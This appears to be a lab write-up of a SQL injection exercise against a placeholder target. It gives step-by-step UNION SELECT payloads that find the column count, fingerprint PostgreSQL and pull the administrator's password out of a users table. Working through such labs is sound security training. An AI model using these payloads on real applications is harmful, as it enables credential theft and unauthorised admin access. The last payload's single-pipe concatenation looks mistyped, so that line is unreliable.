# SQL injection, retrieving multiple values in a single column

### Goal:
`Log in to the application as the administrator user`
### Info: The injection point is the product category filter
`target.com/filter?category=<input>`
### Info: The database contains the table 'users' and the columns 'username' and 'password'

<br><br>

**<ins>Step 1: Test injection point</ins>**

category='

`500: server error`<br><br>

category='--

`200`
<br><br>

**<ins>Step 2: Enumerate data output with UNION attack</ins>**

category='UNION SELECT NULL--

`500 server error`<br><br>

category='UNION SELECT NULL,NULL--

`200`

category='UNION SELECT 'a','b'--

`500 server error`

At least one of these columns cannot output strings.<br><br>

category='UNION SELECT 'a',NULL--

`500 server error`<br><br>

category='UNION SELECT NULL,'b'--

`200`

This means that the second column can output strings.<br><br>

**<ins>Step 3: Enumerate database with UNION attack</ins>**

category='UNION SELECT NULL,@@version--

`500 server error`

This means the database is not MySQL or Microsoft.<br><br>

category='UNION SELECT NULL,version()--

`PostgreSQL 12.16`

This allows us to craft our payloads to work with Postgre syntax.<br><br>

**<ins>Step 4: Exfiltrate data</ins>**

category='UNION SELECT NULL,(username|':'|password) FROM users WHERE username='administrator'--

`<password>`

Attempting to log in with this password grants us administrative access.
